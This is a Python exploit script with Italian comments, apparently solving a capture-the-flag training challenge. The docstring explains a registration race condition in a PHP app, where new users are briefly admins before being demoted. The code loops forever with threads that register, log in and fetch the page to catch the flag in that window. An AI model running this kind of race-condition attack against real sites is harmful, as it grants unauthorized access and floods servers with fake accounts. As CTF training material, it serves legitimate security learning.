'''
La challenge ci chiede: "can you see all challenges?"
Quando un utente viene registrato (in register.php) il codice è il seguente:
    $db->create_user($name, $password);
    $id = $db->get_idusers($name);
    $id = $db->get_idusers($name);
    if ($db->get_admin($id) && $db->get_username($id) === $name) {
        $db->fix_user($id);
    }
- create_user($name, $password): Questa funzione crea un nuovo utente nel database utilizzando il nome utente $name e la password $password.
- get_idusers($name): Questa funzione restituisce l'ID dell'utente corrispondente al nome utente fornito $name. Il risultato viene assegnato alla variabile $id
- get_admin($id): Questa funzione esegue una query preparata per ottenere l'informazione sulla colonna isadmin dalla tabella users dove l'ID dell'utente è 
uguale a $id. Restituisce true se l'utente è un amministratore (quando isadmin è uguale a 1), altrimenti restituisce false.
-  condizione if ($db->get_admin($id) && $db->get_username($id) === $name) verifica se l'utente appena creato è un amministratore e se il nome utente corrisponde a
quello fornito. Se la condizione è vera, la funzione $db->fix_user($id) viene chiamata per impostare l'utente come non amministratore (impostando isadmin a 0).

Poi in login prenderà farà la get delle challenges e le prenderà TUTTE solo se l'utente è admin (se non è admin prende solo quelle dove isenabled è settato a true,
ma a noi servono TUTTE).

Quindi abbiamo un utente che viene prima creato come amministratore e poi viene settato come non admin.
In questo caso dunque l'inconsistent state è l'utente settato come amministratore e per l'exploit dobbiamo sfruttare questo:
registrare un utente e poi loggarsi prima che venga settato come non admin per riuscire a vedere tutte le challenges.
'''

import requests
import random
import string
import threading
import time

baseurl = "http://meta.training.jinblack.it" 

def register(session, username, password):
    url = "%s/register.php" % baseurl
    data = {"username": username, "password_1": password, "password_2": password, "reg_user": ""} # Questi parametri li vuole la post di register.php 
    r = session.post(url, data=data)
    return r.text

def login(session,username, password):
    url = "%s/login.php" % baseurl
    data = {"username": username, "password": password, "log_user": ""} # Questi parametri li vuole la post di login.php
    r = session.post(url, data=data)
    return r.text

def index(session):
    url = "%s/index.php" % baseurl
    r = session.get(url)       # Index.php ha una get (lo vedo su ispeziona elemento -> rete -> index.php -> header)
    if "flag" in r.text:
        print(r.text)
    return r.text

def randomString(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))
    

while True:            

    s = requests.Session()
    u = randomString()
    p = randomString()
    
    t1 = threading.Thread(target=register, args=(s,u,p)) 
    t2 = threading.Thread(target=login, args=(s,u,p))
    t3 = threading.Thread(target=index, args=[s]) # devo mettere [s] e non (s) perchè se no mi dà errore

    t1.start()
    t2.start()

    t1.join()
    t2.join()
    time.sleep(0.1)
    t3.start() # Se lo mettevo dopo t2.start() non andava


    





